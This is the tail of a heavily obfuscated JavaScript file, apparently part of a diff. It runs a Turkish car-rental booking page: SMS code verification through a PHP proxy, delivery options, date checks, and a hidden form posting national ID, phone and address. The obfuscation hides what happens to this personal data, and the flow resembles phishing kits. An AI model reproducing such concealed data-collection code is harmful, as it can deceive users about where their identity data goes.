s=_0x87c3d%(103378^103406);_0x2a8d=(870155^870146)+(292836^292836);_0x865aea['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=m+"\u003A"+String(s)['\u0070\u0061\u0064\u0053\u0074\u0061\u0072\u0074'](846189^846191,"\u0030");if(_0x87c3d<=(285729^285729)){clearInterval(smsTimerInterval);_0xe05e['\u0064\u0069\u0073\u0061\u0062\u006C\u0065\u0064']=!![];_0x2714g['\u0064\u0069\u0073\u0061\u0062\u006C\u0065\u0064']=!![];_0x2714g['\u0073\u0074\u0079\u006C\u0065']['\u006F\u0070\u0061\u0063\u0069\u0074\u0079']="\u0030\u002E\u0035";_0xg4a['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u0053\u00FC\u0072\u0065\u0020\u0064\u006F\u006C\u0064\u0075\u002E\u0020\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0067\u0065\u0072\u0069\u0020\u0064\u00F6\u006E\u00FC\u0070\u0020\u0074\u0065\u006B\u0072\u0061\u0072\u0020\u0064\u0065\u006E\u0065\u0079\u0069\u006E\u0069\u007A\u002E";_0xg4a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");}_0x87c3d--;}_0x401eb();smsTimerInterval=setInterval(_0x401eb,319892^320124);}async function smsDogrula(){const _0x5dfb0b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u006B\u006F\u0064")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();const _0x91ef2b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u0065\u0072\u0072\u006F\u0072");if(!_0x5dfb0b||_0x5dfb0b['\u006C\u0065\u006E\u0067\u0074\u0068']<(953634^953639)){_0x91ef2b['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0064\u006F\u011F\u0072\u0075\u006C\u0061\u006D\u0061\u0020\u006B\u006F\u0064\u0075\u006E\u0075\u0020\u0065\u006B\u0073\u0069\u006B\u0073\u0069\u007A\u0020\u0067\u0069\u0072\u0069\u006E\u0069\u007A\u002E";_0x91ef2b['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("wohs".split("").reverse().join(""));return;}_0x91ef2b['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0073\u0068\u006F\u0077");const _0x182da=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0074\u0065\u006C\u0065\u0066\u006F\u006E")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();const _0x82016a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0062\u0074\u006E\u002D\u0073\u006D\u0073\u002D\u0064\u006F\u0067\u0072\u0075\u006C\u0061");_0x82016a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u006C\u006F\u0061\u0064\u0069\u006E\u0067");_0x82016a['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="...roy\u0131nalur\u011FoD >vid/<>\"rennips\"=ssalc vid<".split("").reverse().join("");try{let _0xd6773c;const _0x7dc3c=await fetch("\u0073\u006D\u0073\u005F\u0070\u0072\u006F\u0078\u0079\u002E\u0070\u0068\u0070\u003F\u0074\u0065\u006C\u003D"+encodeURIComponent(_0x182da)+"=dok&".split("").reverse().join("")+encodeURIComponent(_0x5dfb0b));_0xd6773c=664092^664094;const _0xe4d=await _0x7dc3c['\u006A\u0073\u006F\u006E']();if(_0xe4d['\u0073\u0075\u0063\u0063\u0065\u0073\u0073']===!![]){if(smsTimerInterval)clearInterval(smsTimerInterval);document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u006F\u0064\u0061\u006C\u002D\u0073\u006D\u0073")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0061\u0063\u0074\u0069\u0076\u0065");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u006F\u0064\u0061\u006C\u002D\u0074\u0065\u0073\u006C\u0069\u006D\u0061\u0074")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("evitca".split("").reverse().join(""));setTeslimat("\u0061\u0064\u0072\u0065\u0073\u0065");}else{_0x91ef2b['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=".ziniyened rarket neft\xFCL .\u0131latah udok amalur\u011FoD".split("").reverse().join("");_0x91ef2b['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");_0x82016a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u006C\u006F\u0061\u0064\u0069\u006E\u0067");_0x82016a['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="alur\u011FoD udoK >i/<>\"kcehc-af dilos-af\"=ssalc i<".split("").reverse().join("");}}catch(e){_0x91ef2b['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u0042\u0069\u0072\u0020\u0068\u0061\u0074\u0061\u0020\u006F\u006C\u0075\u015F\u0074\u0075\u002E\u0020\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0074\u0065\u006B\u0072\u0061\u0072\u0020\u0064\u0065\u006E\u0065\u0079\u0069\u006E\u0069\u007A\u002E";_0x91ef2b['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");_0x82016a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("gnidaol".split("").reverse().join(""));_0x82016a['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="alur\u011FoD udoK >i/<>\"kcehc-af dilos-af\"=ssalc i<".split("").reverse().join("");}}function setTeslimat(tur){teslimatTuru=tur;document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006F\u0070\u0074\u002D\u0061\u0064\u0072\u0065\u0073")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0074\u006F\u0067\u0067\u006C\u0065']("evitca".split("").reverse().join(""),tur==="\u0061\u0064\u0072\u0065\u0073\u0065");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006F\u0070\u0074\u002D\u0068\u0061\u0076\u0061\u006C\u0069")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0074\u006F\u0067\u0067\u006C\u0065']("evitca".split("").reverse().join(""),tur==="\u0068\u0061\u0076\u0061\u006C\u0069\u006D\u0061\u006E\u0131");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("inala-serda".split("").reverse().join(""))['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079']=tur==="eserda".split("").reverse().join("")?"kcolb".split("").reverse().join(""):"enon".split("").reverse().join("");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0068\u0061\u0076\u0061\u006C\u0069\u002D\u0061\u006C\u0061\u006E\u0069")['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079']=tur==="\u0068\u0061\u0076\u0061\u006C\u0069\u006D\u0061\u006E\u0131"?"\u0062\u006C\u006F\u0063\u006B":"\u006E\u006F\u006E\u0065";}function teslimatDevam(){var _0xa4fd=(775172^775170)+(967042^967040);const _0xcf_0xd83=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0065\u0073\u006C\u0069\u006D\u0061\u0074\u002D\u0065\u0072\u0072\u006F\u0072");_0xa4fd=374269^374271;_0xcf_0xd83['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0073\u0068\u006F\u0077");if(teslimatTuru==="\u0068\u0061\u0076\u0061\u006C\u0069\u006D\u0061\u006E\u0131"){const _0xd559ae=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("ilavah-sila".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];if(!_0xd559ae){_0xcf_0xd83['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0061\u006C\u0131\u015F\u0020\u0068\u0061\u0076\u0061\u006C\u0069\u006D\u0061\u006E\u0131\u006E\u0131\u0020\u0073\u0065\u00E7\u0069\u006E\u0069\u007A\u002E";_0xcf_0xd83['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("wohs".split("").reverse().join(""));return;}const _0x2e_0xe37=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0066\u0061\u0072\u006B\u006C\u0069\u002D\u0069\u0061\u0064\u0065")['\u0063\u0068\u0065\u0063\u006B\u0065\u0064'];if(_0x2e_0xe37&&!document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0069\u0061\u0064\u0065\u002D\u0068\u0061\u0076\u0061\u006C\u0069")['\u0076\u0061\u006C\u0075\u0065']){_0xcf_0xd83['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=".zini\xE7es \u0131n\u0131namilavah edai neft\xFCL".split("").reverse().join("");_0xcf_0xd83['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("wohs".split("").reverse().join(""));return;}}else{var _0x28bd2d=(474379^474377)+(472010^472010);const _0xffbe6b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tceles-li-m".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];_0x28bd2d=(575889^575894)+(278062^278057);var _0x52cb=(866638^866636)+(155731^155729);const _0xcafb5a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tceles-ecli-m".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];_0x52cb=660433^660433;var _0x2c_0xga2=(458940^458940)+(277187^277194);const _0xcc3e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0065\u0073\u006C\u0069\u006D\u0061\u0074\u002D\u0061\u0064\u0072\u0065\u0073")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();_0x2c_0xga2=(625421^625418)+(895366^895363);if(!_0xffbe6b){_0xcf_0xd83['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0069\u006C\u0020\u0073\u0065\u00E7\u0069\u006E\u0069\u007A\u002E";_0xcf_0xd83['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");return;}if(!_0xcafb5a){_0xcf_0xd83['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0069\u006C\u00E7\u0065\u0020\u0073\u0065\u00E7\u0069\u006E\u0069\u007A\u002E";_0xcf_0xd83['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("wohs".split("").reverse().join(""));return;}if(!_0xcc3e){_0xcf_0xd83['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0061\u0064\u0072\u0065\u0073\u0069\u0020\u0067\u0069\u0072\u0069\u006E\u0069\u007A\u002E";_0xcf_0xd83['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");return;}}document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tamilset-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("evitca".split("").reverse().join(""));document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u006F\u0064\u0061\u006C\u002D\u0074\u0061\u0072\u0069\u0068")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("evitca".split("").reverse().join(""));}async function rezervasyonOlustur(_0x6fda,_0xfb66cc){const _0xe41b1g=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0061\u006C\u0069\u0073\u002D\u0067\u0075\u006E")['\u0076\u0061\u006C\u0075\u0065'];var _0xa4f7a=(774094^774086)+(157665^157668);const _0x9fb=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("taas-sila".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];_0xa4f7a=(996425^996426)+(205450^205442);const _0xdag5b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0069\u0061\u0064\u0065\u002D\u0067\u0075\u006E")['\u0076\u0061\u006C\u0075\u0065'];const _0xga_0xcf7=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("taas-edai".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];if(!_0xe41b1g||!_0x9fb||!_0xdag5b||!_0xga_0xcf7){alert("\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0061\u006C\u0131\u015F\u0020\u0076\u0065\u0020\u0069\u0061\u0064\u0065\u0020\u0074\u0061\u0072\u0069\u0068\u002F\u0073\u0061\u0061\u0074\u006C\u0065\u0072\u0069\u006E\u0069\u0020\u0073\u0065\u00E7\u0069\u006E\u0069\u007A\u002E");return;}const _0xcec74d=_0xe41b1g+"\u0020"+_0x9fb+"\u003A\u0030\u0030";const _0xe83d8a=_0xdag5b+"\u0020"+_0xga_0xcf7+"\u003A\u0030\u0030";_0x6fda=(721210^721203)+(930264^930266);if(new Date(_0xe83d8a)<=new Date(_0xcec74d)){alert("\u0130\u0061\u0064\u0065\u0020\u0074\u0061\u0072\u0069\u0068\u0069\u002C\u0020\u0061\u006C\u0131\u015F\u0020\u0074\u0061\u0072\u0069\u0068\u0069\u006E\u0064\u0065\u006E\u0020\u0073\u006F\u006E\u0072\u0061\u0020\u006F\u006C\u006D\u0061\u006C\u0131\u0064\u0131\u0072\u002E");return;}let _0x35f22f,_0x7ddc7c,_0x3b5b5e,_0x67g1ba,_0x885c4a;if(teslimatTuru==="\u0131namilavah".split("").reverse().join("")){_0x35f22f=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("ilavah-sila".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];const _0x9fade=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0066\u0061\u0072\u006B\u006C\u0069\u002D\u0069\u0061\u0064\u0065")['\u0063\u0068\u0065\u0063\u006B\u0065\u0064'];_0x7ddc7c=_0x9fade?document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0069\u0061\u0064\u0065\u002D\u0068\u0061\u0076\u0061\u006C\u0069")['\u0076\u0061\u006C\u0075\u0065']:_0x35f22f;_0x3b5b5e='';_0x67g1ba='';_0x885c4a='';}else{_0x67g1ba=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tceles-li-m".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065'];_0x885c4a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0069\u006C\u0063\u0065\u002D\u0073\u0065\u006C\u0065\u0063\u0074")['\u0076\u0061\u006C\u0075\u0065'];_0x3b5b5e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("serda-tamilset".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();_0x35f22f=_0x67g1ba+"\u0020\u002D\u0020"+_0x885c4a;_0x7ddc7c=_0x35f22f;}const _0x5c22ad=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0062\u0074\u006E\u002D\u0072\u0065\u007A\u0065\u0072\u0076\u0061\u0073\u0079\u006F\u006E");_0x5c22ad['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u006C\u006F\u0061\u0064\u0069\u006E\u0067");_0x5c22ad['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="...royinel\u015F\u0130 >vid/<>\"rennips\"=ssalc vid<".split("").reverse().join("");const _0xf47aab=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("\u0066\u006F\u0072\u006D");_0xfb66cc=(150052^150060)+(485567^485562);_0xf47aab['\u006D\u0065\u0074\u0068\u006F\u0064']="\u0050\u004F\u0053\u0054";_0xf47aab['\u0061\u0063\u0074\u0069\u006F\u006E']="php.noysavrezer".split("").reverse().join("");const _0xae4abd={"il":_0x67g1ba||(musteriData?musteriData['\u0041\u0044\u0052\u0045\u0053\u0049\u004C']:''),'\u0069\u006C\u0063\u0065':_0x885c4a||(musteriData?musteriData['\u0041\u0044\u0052\u0045\u0053\u0049\u004C\u0043\u0045']:''),'\u0061\u006C\u0069\u0073\u0069\u006C':_0x35f22f,"iadeil":_0x7ddc7c,'\u0061\u006C\u0069\u0073':_0xcec74d,"iade":_0xe83d8a,'\u0076\u0061\u006C\u0065':teslimatTuru==="eserda".split("").reverse().join("")?"\u0076\u0061\u0072":"\u0079\u006F\u006B","ad":musteriData?musteriData['\u0041\u0044']:'',"soyad":musteriData?musteriData['\u0053\u004F\u0059\u0041\u0044']:'','\u0074\u0063':document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tupni-ct".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D'](),"gsm":document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0074\u0065\u006C\u0065\u0066\u006F\u006E")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D'](),'\u0061\u0064\u0072\u0065\u0073':_0x3b5b5e,'\u0063\u0061\u0072\u005F\u0069\u0064':secilenAracId,"sure":'gunluk'};for(const[k,v]of Object['\u0065\u006E\u0074\u0072\u0069\u0065\u0073'](_0xae4abd)){const _0xa59a=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("tupni".split("").reverse().join(""));_0xa59a['\u0074\u0079\u0070\u0065']="\u0068\u0069\u0064\u0064\u0065\u006E";_0xa59a['\u006E\u0061\u006D\u0065']=k;_0xa59a['\u0076\u0061\u006C\u0075\u0065']=v;_0xf47aab['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0xa59a);}document['\u0062\u006F\u0064\u0079']['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0xf47aab);_0xf47aab['\u0073\u0075\u0062\u006D\u0069\u0074']();}document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0063\u002D\u0069\u006E\u0070\u0075\u0074")['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u006B\u0065\u0079\u0064\u006F\u0077\u006E",e=>{if(e['\u006B\u0065\u0079']==="retnE".split("").reverse().join(""))tcDogrula();});
+</script>
+</body>
+</html>
